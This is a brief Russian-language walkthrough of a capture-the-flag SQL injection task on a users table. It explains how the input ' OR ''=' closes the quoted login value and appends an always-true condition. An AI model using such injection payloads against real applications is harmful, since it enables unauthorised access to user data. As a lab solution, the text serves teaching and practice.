# opisanye
Таблица: users
Поля: id, login, pass
Запрос: SELECT * FROM users WHERE id=2 OR login='$text' (вместо $text подставляется введённое ниже значение)
Подсказка: использовать мозг и кавычку 

- !!! ТУТ НЕ ИСПОЛЬЗУЮТСЯ ДВОЙНЫЕ КАВЫЧКИ 

# writeup

```sql
SELECT * FROM users WHERE id=2 OR login='$text' 
```
(вместо $text подставляется введённое ниже значение)

нам надо чтобы условие `OR login='$text' ` соблюдалось
мы можем также ввести кавычку внутри `$text`

т.е. при `$text`=`' OR '`
```sql
SELECT * FROM users WHERE id=2 OR login='|' OR '|' (для наглядности добавил разделители)
```
```sql
SELECT * FROM users WHERE id=2 OR login='' OR '' (вот без разделителя)
```

получается мы можем встроить своё условие

например `' OR ''='` 
тогда конечный запрос будет:

```sql
SELECT * FROM users WHERE id=2 OR login='' OR ''=''
```
где 100% выполняется условие `''=''` (пустая строка = пустой строке)

